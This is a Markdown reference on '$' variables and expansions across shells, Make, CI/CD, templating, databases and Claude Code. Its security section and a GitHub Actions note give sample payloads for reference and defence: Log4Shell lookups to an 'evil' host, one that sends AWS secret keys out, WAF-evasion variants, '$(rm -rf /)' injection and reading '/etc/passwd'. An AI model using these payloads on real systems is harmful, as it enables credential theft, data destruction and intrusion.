<!-- SPDX-License-Identifier: AGPL-3.0-or-later OR EUPL-1.2 -->
<!-- Copyright 2026 Saimonokuma. -->
# The $ Sigil: Variables and Their Variants, Across Contexts

A reference catalogue, not a hazard list. Every entry below is meant to be read: the
ones marked as needing care are marked because the care is *stated beside them*, never
to warn a reader off. Nothing here is excluded from study, and no entry is described as
unnecessary — a sigil that is rare in one language is the daily driver of another, which
is the whole reason the collision table at the end exists.

Read it as ten topics, one utility ranking and one collision table. The ranking orders
by how often a sigil is reached for, not by how safe it is; safety is a property of the
form you write, and the safe form is given with each entry.

## TOPIC-RANKED CATALOG

### TOPIC 1 — Shell Parameter Expansion (Bash/POSIX)

| Variant | Meaning | Example | Notes/Gotcha |
|---|---|---|---|
| `${var:-word}` | Use `word` if var unset/null | `${x:-def}` | Doesn't assign |
| `${var-word}` | Use `word` only if unset | `${x-def}` | Null stays null |
| `${var:=word}` | Assign `word` if unset/null | `${x:=def}` | Mutates var |
| `${var=word}` | Assign only if unset | — | POSIX |
| `${var:?msg}` | Error+exit if unset/null | `${x:?required}` | Info-leak risk in logs |
| `${var?msg}` | Error only if unset | — | — |
| `${var:+word}` | Use `word` if var IS set | `${x:+--flag}` | Great for optional flags |
| `${var+word}` | `word` if set (even null) | — | — |
| `${#var}` | Length of value | `${#PATH}` | Char count |
| `${#@}` / `${#*}` | Number of positional params | `${#@}` | Same as `$#` |
| `${#arr[@]}` | Array element count | — | — |
| `${var:offset}` | Substring from offset | `${x:7}` | 0-based |
| `${var:offset:length}` | Substring w/ length | `${x:0:3}` | — |
| `${var: -N}` | Last N chars (note space!) | `${x: -3}` | Space or `(-N)` required |
| `${var#pat}` | Remove shortest prefix | `${f#*/}` | — |
| `${var##pat}` | Remove longest prefix | `${f##*/}` | Basename idiom |
| `${var%pat}` | Remove shortest suffix | `${f%.*}` | — |
| `${var%%pat}` | Remove longest suffix | `${f%%.*}` | — |
| `${var/pat/rep}` | Replace first match | `${x/foo/bar}` | — |
| `${var//pat/rep}` | Replace all | `${x//,/ }` | — |
| `${var/#pat/rep}` | Replace prefix only | — | Anchored start |
| `${var/%pat/rep}` | Replace suffix only | — | Anchored end |
| `${var/pat}` | Delete first match | `${x/foo}` | Empty replacement |
| `${var@/}` | Bash 5.2 pattern xform | — | Newer (community-corroborated) |
| `${var^}` / `${var^^}` | Upper first / all | `${x^^}` | Bash 4.0+ |
| `${var,}` / `${var,,}` | Lower first / all | `${x,,}` | Bash 4.0+ |
| `${var~}` / `${var~~}` | Toggle case | — | Effectively undocumented |
| `${!var}` | Indirect expansion | `p=x; ${!p}` | — |
| `${!prefix*}` / `${!prefix@}` | Names matching prefix | `${!BASH*}` | — |
| `${!arr[@]}` / `${!arr[*]}` | Array keys/indices | — | Assoc arrays |
| `${arr[@]}` / `${arr[*]}` | All elements | `"${a[@]}"` | Quoted, one word per element; unquoted, re-split on `$IFS` |
| `${arr[@]:s:l}` | Array slice | `${a[@]:1:2}` | — |

**Parameter transformation operators (Bash 4.4+, `${parameter@op}`):**

| Op | Meaning | Version |
|---|---|---|
| `@U` | Uppercase all | 4.4 |
| `@u` | Uppercase first | 4.4 |
| `@L` | Lowercase all | 4.4 |
| `@Q` | Quote for safe re-input | 4.4 |
| `@E` | Expand escapes (like `$'...'`) | 4.4 |
| `@P` | Expand as prompt string | 4.4 |
| `@A` | Assignment statement to recreate var | 4.4 |
| `@a` | Attribute flags | 4.4 |
| `@K` | Quoted key-value pairs (arrays) | 5.1 |
| `@k` | Like `@K`, split to words | 5.1 |

```bash
name="jHON dOE"
echo "${name@U}"    # JHON DOE
echo "${name^^}"    # JHON DOE
f="/etc/nginx/nginx.conf"
echo "${f##*/}"     # nginx.conf
echo "${f%.*}"      # /etc/nginx/nginx
x=""
echo "${x:-fallback}"  # fallback
echo "${x-fallback}"   # (empty — x is set but null)
```

**Substitutions & quoting forms:**

| Variant | Meaning | Example | Notes |
|---|---|---|---|
| `$(...)` | Command substitution | `$(date)` | Preferred, nestable |
| `` `...` `` | Legacy command sub | `` `date` `` | Hard to nest |
| `$(<file)` | Fast file read | `$(<f.txt)` | No `cat` fork |
| `$((...))` | Arithmetic expansion | `$((2+2))` | — |
| `$[...]` | Legacy arithmetic | `$[2+2]` | Superseded by `$((...))`; still parsed by bash for old scripts |
| `$'...'` | ANSI-C quoting | `$'a\tb'` | Escapes |
| `$"..."` | Locale translation | `$"Hello"` | i18n |
| `<(...)` | Process substitution (in) | `diff <(a) <(b)` | Bash/Zsh |
| `>(...)` | Process substitution (out) | `tee >(gzip)` | — |

### TOPIC 2 — Shell Special & Environment Variables

| Variant | Meaning | Notes |
|---|---|---|
| `$RANDOM` | Random 0–32767 | Not crypto-safe |
| `$SRANDOM` | 32-bit random from kernel | Bash 5.1+, better entropy |
| `$SECONDS` | Seconds since shell start | — |
| `$LINENO` | Current line number | Debug |
| `$FUNCNAME` | Call-stack function names (array) | Bash only |
| `$BASH_SOURCE` | Source file stack | `${BASH_SOURCE[0]}` idiom |
| `$BASH_LINENO` | Caller line numbers | — |
| `$BASH_SUBSHELL` | Subshell nesting level | — |
| `$BASHPID` | PID of current subshell | Differs from `$$` in subshells |
| `$$` | PID of shell | Doesn't change in subshells |
| `$PIPESTATUS` | Exit codes of pipeline (array) | `${PIPESTATUS[@]}` |
| `$BASH_REMATCH` | Regex captures from `[[ =~ ]]` | Index 0 = whole match |
| `$EPOCHSECONDS` | Unix time (s) | Bash 5.0+ |
| `$EPOCHREALTIME` | Unix time w/ microseconds | Bash 5.0+ |
| `$BASH_COMMAND` | Currently executing command | Traps |
| `$BASH_ARGV`/`$BASH_ARGC`/`$BASH_ARGV0` | Arg stack / count / $0 | Debug/extdebug |
| `$BASH_EXECUTION_STRING` | Arg to `bash -c` | — |
| `$BASH_VERSION` / `$BASH_VERSINFO` | Version string / array | — |
| `$REPLY` | Default for `read`/`select` | — |
| `$OPTARG` / `$OPTIND` | `getopts` state | — |
| `$IFS` | Field separator | Word-splitting core |
| `$PS0`–`$PS4` | Prompt strings | `$PS4` for `set -x` |
| `$PROMPT_COMMAND` | Runs before each prompt | — |
| `$PWD` / `$OLDPWD` | Current / previous dir | — |
| `$SHLVL` | Shell nesting level | — |
| `$UID` / `$EUID` / `$GROUPS` | IDs | Read-only |
| `$HOSTNAME` / `$HOSTTYPE` / `$MACHTYPE` / `$OSTYPE` | Machine info | — |
| `$LINES` / `$COLUMNS` | Terminal size | — |
| `$COMP_WORDS`/`$COMP_CWORD`/`$COMP_LINE`/`$COMP_POINT`/`$COMPREPLY` | Completion API | — |
| `$FUNCNEST` / `$GLOBIGNORE` / `$CDPATH` / `$TMOUT` | Behavior controls | — |
| `$HISTFILE` / `$HISTSIZE` / `$MAPFILE` / `$COPROC` | History / mapfile / coproc | — |

```bash
echo "$RANDOM"           # e.g. 27182
[[ "abc123" =~ ([a-z]+)([0-9]+) ]]
echo "${BASH_REMATCH[1]}"  # abc
echo "${BASH_REMATCH[2]}"  # 123
false | true
echo "${PIPESTATUS[@]}"    # 1 0
```

### TOPIC 3 — Cross-Shell Divergence (same sigil, different meaning)

**Zsh:** `$argv` (positional array), `$ZSH_ARGZERO`, 1-based arrays, no default word-splitting. Expansion flags: `${(s:x:)v}` split on x, `${(j:,:)a}` join, `${(f)v}` split lines, `${(F)a}` join newline, `${(U)v}` upper, `${(P)v}` indirect, `${(k)h}`/`${(v)h}` keys/values, `${(q)v}` quote, `${(A)}` array assign, `$pipestatus` (lowercase), `$funcstack`.

**Ksh:** `${.sh.version}`, `${.sh.match}` (regex), `${.sh.value}` (discipline functions).

**Fish:** `$argv`, `$status` (not `$?`), `$pipestatus`, **no** `$@`/`$$`/`$()` — uses `(command)`. List semantics throughout.

**Nushell:** `$env`, `$in` (pipeline input), `$nu`, `$it` (legacy).

**PowerShell:** `$args`, `$_`/`$PSItem`, `$?` (boolean success), `$^`/`$$` (first/last token of last line), `$LASTEXITCODE`, `$Error`, `$MyInvocation`, `$PSBoundParameters`, `$PSScriptRoot`, `$PSCommandPath`, `$null`/`$true`/`$false`, `$OFS`, `$Matches`, `$PID`, `$PROFILE`. Scope modifiers: `$global:`, `$script:`, `$local:`, `$env:`, `$using:`. Splatting: `@args` vs `$args`. Subexpression `$(...)`.

**cmd.exe (contrast — uses `%` not `$`):** `%1`, `%*`, `%~dp1`.

```powershell
Get-Process | Where-Object { $_.CPU -gt 100 }   # $_ = pipeline item
& someexe; if ($?) { "ok" }                      # $? is boolean
```

### TOPIC 4 — Build Systems

**GNU Make automatic variables** (recomputed per rule, valid only in recipes):

| Variant | Meaning |
|---|---|
| `$@` | Target name |
| `$<` | First prerequisite |
| `$^` | All prerequisites (deduped) |
| `$+` | All prerequisites (with dups) |
| `$?` | Prereqs newer than target |
| `$*` | Stem of pattern rule |
| `$%` | Archive member target |
| `$|` | Order-only prerequisites |
| `$(@D)` `$(@F)` | Dir / file part of target |
| `$(<D)` `$(<F)` | Dir / file of first prereq |
| `$(^D)` `$(^F)`, `$(*D)` `$(*F)`, `$(%D)` `$(%F)`, `$(?D)` `$(?F)` | D/F variants |
| `$$` | Escape to literal `$` for shell |
| `$(VAR)` / `${VAR}` | Variable reference |
| `$(var:pat=repl)` | Substitution reference |
| `$$@`, `$$(@D)`, `$$(@F)` | SysV secondary-expansion in prereqs |

Make functions taking `$`: `$(subst)`, `$(patsubst)`, `$(shell)`, `$(call)` with `$(1)`/`$(2)`, `$(eval)`, `$(foreach)`.

```makefile
build/app: main.o util.o
	$(CC) -o $@ $^      # $@=build/app  $^=main.o util.o
	@echo $(@D)         # build
	@echo $(@F)         # app
```

**Make and the shell both spell it `$@`.** In a Makefile recipe, `$@` is the *Make target*, but to reference the *shell's* `$@` you must write `$$@`. Similarly `$$?`, `$$*`, `$$$$` for shell PID. Note the D/F variants are officially "semi-obsolete" — `$(dir)`/`$(notdir)` functions are preferred (but the D variants omit the trailing slash `dir` always adds).

**CMake:** `${VAR}`, `$ENV{VAR}`, `$CACHE{VAR}`, and generator expressions: `$<CONFIG>`, `$<CONFIG:Debug>`, `$<TARGET_FILE:tgt>`, `$<TARGET_FILE_NAME:tgt>`, `$<IF:cond,a,b>`, `$<JOIN:list,sep>`, `$<BOOL:x>`, `$<STREQUAL:a,b>`, `$<VERSION_LESS:a,b>`, `$<TARGET_PROPERTY:tgt,prop>`, `$<BUILD_INTERFACE:...>`, `$<INSTALL_INTERFACE:...>`, `$<LINK_LIBRARY:FRAMEWORK,...>` — nestable, evaluated at generation time (critical for multi-config generators like Ninja Multi-Config / Visual Studio where `${CMAKE_BUILD_TYPE}` is unknown at configure time).

**Bazel:** `$(location //tgt)`, `$@` (single output), `$<` (single source), `$(RULEDIR)`, `$(OUTS)`.
**Just:** `{{var}}` (not `$`), but `$VAR` passes to shell. **Ninja:** `$in`, `$out`, `$$` escape.

### TOPIC 5 — CI/CD & Container Config

**Docker/Compose:** `${VAR}`, `${VAR:-default}`, `${VAR-default}`, `${VAR:?err}`, `${VAR:+alt}`; `$$` escapes to literal `$` in Compose. ARG (build-time) vs ENV (run-time) expansion timing.

**Kubernetes:** `$(VAR_NAME)` env-var expansion in `command`/`args`/`env`; `$$(VAR)` → literal `$(VAR)`; downward API.

**GitHub Actions:** `${{ expressions }}` (evaluated before shell), `$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_STEP_SUMMARY`, `$GITHUB_PATH`, `$GITHUB_WORKSPACE`. **Trap:** `${{ }}` is substituted into the script *textually before* the shell runs — untrusted `github.event.*` (title, body, head_ref, label, email, branch names) → script injection. Even a branch name like `zzz";echo${IFS}"hello";#` is a valid attack vector.

**GitLab CI:** `$CI_*` predefined (`$CI_COMMIT_SHA`, `$CI_PIPELINE_ID`, etc.), `$$` escaping, `$VARIABLE` vs `${VARIABLE}`.

**Azure Pipelines (three distinct syntaxes):** `$(var)` runtime (macro), `${{ }}` compile-time (template expression), `$[ ]` runtime expression.

**Jenkins/Groovy:** `${}` (double-quote GString interpolation only), `params.X`.
**systemd:** `$VAR` / `${VAR}` in `ExecStart`, `$$` for literal `$`; contrast `%i`/`%n` specifiers.
**Terraform:** `${...}` interpolation, `$${...}` escape → literal `${`, `%{...}` directives, `%%{` escape, heredoc `<<EOT` / `<<-EOT` (indented), `templatefile()`.
**Helm:** `{{ }}` with `$` root context, `$` in `range`, `$.Values`.
**Tools:** `envsubst`, `gomplate`, `direnv`.

```yaml
# GitHub Actions — SAFE pattern (avoids injection)
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"    # NOT echo "${{ github.event.issue.title }}"
```

```hcl
# Terraform user_data mixing TF + shell vars
user_data = <<-EOT
  echo "env is ${var.environment}"   # Terraform interpolates
  echo "home is $${HOME}"            # literal ${HOME} for the shell
EOT
```

### TOPIC 6 — Templating / Regex / Text Processing

**Regex replacement backreferences:** `$1`–`$9` (JS/.NET/PCRE), `$&` (whole match), `` $` `` (before match), `$'` (after match), `$$` (literal `$`), `$<name>` (named group), `\1` (sed/POSIX). `$` also = end-of-line/string anchor; `\Z`/`\z` variants. **Gotcha:** `$$&` inserts a literal `$` followed by the match; VS Code needs `$$$1` to emit `$` + group 1.
**sed:** `$` = last-line address, `&` = whole match, `\1` = group.
**awk:** `$0` (whole record), `$1`–`$NF`, `$NF`, `$(NF-1)`, `$(expr)` dynamic field; assigning `$0` rebuilds fields.
**Perl:** `$_`, `@_`, `$0`, `$1..`, `@ARGV`, `$/` (input sep), `$\` (output sep), `$,`, `$;`, `$!` (errno), `$@` (eval error), `$?` (child status), `$$` (PID), `$<`/`$>` (uid/euid), `$^W`; `use English` aliases.
**PHP:** `$var`, `$$var` (variable variables), `$this`, superglobals `$_GET`/`$_POST`/`$_SERVER`/`$_ENV`/`$_SESSION`/`$_COOKIE`/`$_FILES`/`$_REQUEST`/`$GLOBALS`, `$argv`/`$argc`, heredoc `<<<EOT` (expands) vs nowdoc `<<<'EOT'` (literal) — a direct analog of Bash `<<EOF` vs `<<'EOF'`.
**JS/TS:** template literals `${expr}`, tagged templates, `$` as identifier, jQuery `$`, Bun Shell `` $`cmd` ``.
**Other languages:** Kotlin `$var`/`${expr}`; Scala `s"$x"`; C# `$""` interpolated + `$@""` verbatim-interpolated; Ruby `#{}` and globals `$:`, `$stdout`, `$~`, `$1`; Python `string.Template` `$var`/`${var}`/`$$`.
**Template engines:** Velocity `$var`/`$!var`/`${var}`/`$!{var}`; Jinja/Ansible `{{ }}` (contrast).
**Editor snippets (VS Code/IntelliJ):** `$1`,`$2`,`$0` tabstops, `${1:default}`, `${1|a,b,c|}` choices, `${TM_FILENAME}` and other variables, transforms `${var/regex/fmt/opts}`.

```php
$lang = "PHP";
echo <<<EOT
Runs in $lang           // heredoc expands → "Runs in PHP"
EOT;
echo <<<'EOT'
Literal $lang           // nowdoc → "Literal $lang"
EOT;
```

### TOPIC 7 — Database / Query / Data Tools

**PostgreSQL:** dollar-quoting `$$...$$` and `$tag$...$tag$` (tags case-sensitive, follow unquoted-identifier rules, cannot contain `$`), positional params `$1`,`$2` in prepared statements/PL-pgSQL, common `$BODY$` convention. Per the docs: "A dollar sign (`$`) followed by digits is used to represent a positional parameter in the body of a function definition or a prepared statement. In other contexts the dollar sign can be part of an identifier or a dollar-quoted string constant."
**MySQL:** `DELIMITER $$`.
**jq:** `$var` (from `--arg`), `$ENV`, `$__loc__`, `$ARGS.named`, `$ARGS.positional` (`--args`/`--jsonargs`), format strings `@base64`/`@base64d`/`@csv`/`@tsv`/`@sh`/`@json`/`@uri`/`@html`.
**MongoDB:** operators `$set`/`$gt`/`$match`/`$group`; field paths `"$field"` (equivalent to `"$$CURRENT.field"`); aggregation variables prefixed `$$` — context system vars `$$NOW`/`$$CLUSTER_TIME`; marker-flag vars `$$ROOT`/`$$CURRENT`/`$$REMOVE`/`$$PRUNE`/`$$DESCEND`/`$$KEEP`; bind/user vars via `$let`/`$map`/`$filter`/`$lookup`.
**nginx:** `$host`, `$remote_addr`, `$request_uri`, `$args`, `$arg_NAME`, `$uri`, `$scheme`, `$http_NAME`, `$sent_http_NAME`, `$cookie_NAME`, `$upstream_addr`/`$upstream_status`/`$upstream_response_time`, `$server_name`, `$body_bytes_sent`, `$binary_remote_addr` (~195 total in the official variable index).
**Grafana:** `$var`, `${var:csv}`, `${var:pipe}`, `$__interval`, `$__interval_ms`, `$__rate_interval`, `$__rate_interval_ms`, `$__range`/`$__range_ms`/`$__range_s`, `$__from`/`$__to`, `$__timeFilter`/`$timeFilter`, `$__user.*`, `$__org.*`, `${__value}`.
**Excel/Sheets:** absolute refs `$A$1`, mixed `$A1`, `A$1`.

```javascript
// PostgreSQL prepared statement + JS regex — SAME token, different meaning
// SQL:  SELECT * FROM t WHERE id = $1          ← positional param
"John Smith".replace(/(\w+)\s(\w+)/, "$2, $1"); // "Smith, John" ← regex group
```

### TOPIC 8 — Version Control & Document Systems

**RCS/CVS/SVN keyword expansion:** `$Id$`, `$Revision$`, `$Date$`, `$Author$`, `$Header$`, `$Log$`, `$Name$`, `$Locker$`, `$RCSfile$`, `$Source$`, `$State$`, `$CVSHeader$`. Form: `$keyword$` and `$keyword:...$` are replaced with `$keyword:value$` on checkout. Git's `gitattributes` `ident` filter expands `$Id$` → `$Id:<sha>$`. [MIT](https://web.mit.edu/~xela/WWW/cvs-keywords.html)
**Git env:** `$GIT_DIR`, `$GIT_AUTHOR_NAME`/`$GIT_AUTHOR_EMAIL`/`$GIT_AUTHOR_DATE`, `$GIT_COMMITTER_*`, `$GIT_INDEX_FILE` (hooks).
**LaTeX/Math:** inline `$...$`, display `$$...$$`; Markdown/MathJax/KaTeX `$`/`$$` delimiters; escape literal with `\$`. Collides with shell inside fenced code.

```
$Id: report.md,v 1.5 2026/09/04 12:00:00 alice Exp $
```

### TOPIC 9 — AI Tooling (Claude Code) — verified against official Anthropic docs

Per **code.claude.com/docs** (custom commands are now merged into Skills; `.claude/commands/*.md` still work identically):

| Variant | Meaning | Notes |
|---|---|---|
| `$ARGUMENTS` | Whole argument string as typed | If unused, appended as `ARGUMENTS: <value>` |
| `$ARGUMENTS[N]` | Argument by **0-based** index | `$ARGUMENTS[0]` = first |
| `$N` (`$0`,`$1`,…) | Shorthand for `$ARGUMENTS[N]` | **`$0` = first, `$1` = second** |
| `$name` | Named arg from `arguments:` frontmatter | Maps to positions in order |
| `@path` | File reference — attaches file contents | `@src/app.js` |
| `` !`cmd` `` | Run shell before send; output injected | Needs `allowed-tools` pre-approval |

Frontmatter fields: `description`, `argument-hint`, `allowed-tools`, `disallowed-tools`, `model`, `effort`, `disable-model-invocation`, `user-invocable`, `arguments`, `context`/`agent`/`background`, `hooks`, `shell`, `when_to_use`, `name` (ignored in command files), `paths` (ignored in command files).

Hooks: input arrives as **JSON on stdin** (parse with `jq`), NOT env vars. Path/env vars available: `$CLAUDE_PROJECT_DIR` (project root; also set for stdio MCP servers), `$CLAUDE_PLUGIN_ROOT`, `$CLAUDE_PLUGIN_DATA`, `$CLAUDE_ENV_FILE` (SessionStart/Setup/CwdChanged/FileChanged only), `$CLAUDE_CODE_REMOTE`, `$CLAUDE_EFFORT`. `settings.json` does **not** support general `${VAR}` interpolation (open feature requests #4276, #46889 confirm this); only HTTP-hook `headers` support `$VAR`/`${VAR}` (gated by `allowedEnvVars`); `.mcp.json` supports `$VAR`/`${VAR}`.

**Indexing, as it currently stands.** Many third-party guides still say "`$1` is the first argument, like shell." Per current official docs this is **wrong** — Claude Code is 0-based (`$0` first). As buildthisnow.com (summarizing current docs) puts it: "`$N` is zero-based shorthand for `$ARGUMENTS[N]`, which means `$0` is the first argument and `$1` is the second. Many older blog posts say `$1` is the first argument… That is wrong in current Claude Code. `$0` is first." GitHub issue anthropics/claude-code #19355 tracks the doc-parity confusion.

```markdown
---
description: Migrate a component
argument-hint: [name] [from] [to]
allowed-tools: Read, Edit
---
Migrate the $0 component from $1 to $2.
<!-- /migrate-component SearchBar JavaScript TypeScript
     → $0=SearchBar  $1=JavaScript  $2=TypeScript -->
```

Comparable tools: Cursor rules, Aider, Continue, GitHub Copilot prompt files use similar placeholder ideas but different syntaxes.

### TOPIC 10 — Security (`$`-syntax attack classes)

| Attack | Vector | Example |
|---|---|---|
| **Log4Shell** (CVE-2021-44228, CVSS 10.0) | `${jndi:ldap://}` lookup in logged input | `${jndi:ldap://evil/x}` |
| Log4j obfuscation | Nested lookups evade WAF | `${${lower:j}ndi:...}`, `${${::-j}${::-n}...}` |
| Log4j exfil | `${env:}`/`${sys:}` in URL | `${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.evil/}` |
| **GitHub Actions injection** | `${{ github.event.* }}` in `run:` | title `$(rm -rf /)` |
| `${IFS}` bypass | Space-less command injection | `cat${IFS}/etc/passwd`, `$IFS$9` |
| `${var@P}` RCE | Prompt-expansion executes `$()` | `@P` on values you wrote; untrusted data goes through `@Q` first |
| `${!var}` indirect | Attacker controls indirection target | — |
| Shellshock (CVE-2014-6271) | `() { :;};` in env-function | GNU Bash function-def env-var parsing RCE |
| **SSTI** | `${...}`/`#{}` in templates | Freemarker/Velocity/Thymeleaf/Groovy/Spring EL |
| `eval "$@"` | Argument injection | Quote & validate |
| `${var:?}` | Error message info-leak | Avoid secrets in var |
| envsubst/dotenv leak | Over-broad expansion | Scope templates |
| Unicode homoglyphs | `$` lookalikes bypass filters | — |

```bash
# ${IFS} WAF-bypass demonstration (defensive knowledge)
echo${IFS}hello        # → hello  (space replaced by $IFS)
```

---

## UTILITY RANKING (cross-cutting tiers)

**Tier S — Daily Driver (master these):**
`$1`–`$9`/`$@`/`$*`/`$#` (shell positionals); `${var:-default}`, `${var:=}`, `${var:?}`, `${var:+}`; `${var#pat}`/`${var%pat}`/`${##}`/`${%%}`; `${var/pat/rep}`/`//`; `${#var}`; `$(...)`; `$((...))`; `$?`/`$$`/`$!`; `"${arr[@]}"`; Make `$@`/`$<`/`$^`; Docker/Compose `${VAR:-default}`; GitHub Actions `${{ }}`; PostgreSQL `$$...$$` and `$1`; jq `$var`; regex `$1`/`$&`; JS `${}` template literals; Claude Code `$ARGUMENTS`. — *High use, used constantly.*

**Tier A — Frequently Useful:**
`${var^^}`/`${var,,}`; `${!var}` indirect; `$IFS`; `$LINENO`/`$FUNCNAME`/`$BASH_SOURCE`; `$PIPESTATUS`; `$BASH_REMATCH`; `${var@Q}`; CMake `${VAR}`/`$<CONFIG>`/`$<TARGET_FILE>`; Terraform `${}`/`$${}`; nginx `$host`/`$remote_addr`; Grafana `$__interval`/`$__rate_interval`; MongoDB `$$ROOT`/`$$NOW`; PowerShell `$_`/`$PSItem`; Perl `$_`/`$!`/`$@`; PHP superglobals; VS Code `$1`/`${1:default}`. — *Reach for these weekly.*

**Tier B — Situational:**
`${var:offset:length}`, `${var/#}`/`${var/%}`; `$SECONDS`/`$RANDOM`/`$EPOCHSECONDS`; `${!prefix*}`; process substitution `<()`/`>()`; `$'...'`/`$"..."`; Make `$(@D)`/`$(@F)`/`$*`/`$%`/`$|`; K8s `$(VAR)`; Azure `$[ ]`/`${{ }}`; jq `$ENV`/`$ARGS.named`/`@base64`; awk `$NF`/`$(NF-1)`; `$Id$` keywords; Zsh `${(f)}`/`${(j:,:)}`; PowerShell scope modifiers. — *Know they exist; look up syntax.*

**Tier C — Obscure/Niche:**
`${var@A}`/`@a`/`@K`/`@k`/`@E`/`@u`/`@L`; `${var~~}`; `$SRANDOM`; `$BASH_SUBSHELL`/`$BASHPID`/`$BASH_ARGC`/`$BASH_ARGV`; `$COMP_WORDS`/`$COMPREPLY`; `$FUNCNEST`; ksh `${.sh.match}`; Nushell `$in`; Velocity `$!{var}`; regex `` $` ``/`$'`; `$Log$`/`$Locker$`; SysV Make `$$@`. — *Power-user / rarely needed.*

**Tier D — Use under a stated rule (deprecated, superseded, or safe only when the rule holds):**
`$[...]` (deprecated arithmetic → use `$((...))`); unquoted `$@`/`$*` (word-splitting bugs); Make `$@` vs shell `$@` confusion (need `$$@`); `${var@P}` on untrusted input (RCE); `${!var}` on untrusted input; `${jndi:...}` (Log4Shell); `${{ github.event.* }}` in `run:` (script injection); `eval "$@"`; `${var:?secret}` (info-leak); `$Log$` CVS keyword (merge-conflict magnet); `${var~}`/`${var~~}` (undocumented, may be removed). — *Each entry names the form that is safe and the condition it is safe under; the rule travels with the entry.*

---

## Details — Cross-Context COLLISION TABLE

The single most valuable reference: identical tokens, divergent meanings.

| Token | Shell | Make | PostgreSQL | Regex | PowerShell | Claude Code | Other |
|---|---|---|---|---|---|---|---|
| `$@` | All positional args | **Target name** | — | — | — | — | Perl: eval error |
| `$*` | All args (IFS-joined) | **Pattern stem** | — | — | — | — | — |
| `$?` | Last exit code (int) | **Newer prereqs** | — | — | **Boolean success** | — | Perl: child status |
| `$$` | **PID** | **Literal `$`** | **Dollar-quote delim** | Literal `$` (replace) | Last token of line | — | Compose: literal `$` |
| `$<` | (n/a) | **First prerequisite** | — | — | — | — | Perl: real UID |
| `$1` | First positional arg | — | **First bind param** | **First capture group** | — | **SECOND arg (0-based!)** | VS Code: tabstop 1 |
| `$0` | Script name | — | — | — | — | **FIRST arg** | awk: whole record |
| `$_` | Last arg of prev cmd | — | — | — | **Pipeline item** | — | Perl: default var |
| `${VAR}` | Param expansion | Var reference | — | — | Scoped var | — | Terraform/Docker: interp |
| `$&` | (bg job control) | — | — | **Whole match** | — | — | sed: `&` = match |
| `$!` | Last background PID | — | — | — | — | — | Perl: errno |

```bash
# The $$ four-way collision in ONE conceptual line:
echo $$                 # shell → 48291 (PID)
# Makefile:  echo $$    # Make  → literal "$"
# psql:      $$ ... $$   # Postgres → dollar-quote body
# compose:   $$VAR       # Compose → literal "$VAR"
```

```makefile
demo:
	@echo $@        # Make target → "demo"
	@set -- a b c; echo $$@   # shell $@ → "a b c" (note $$)
```

---
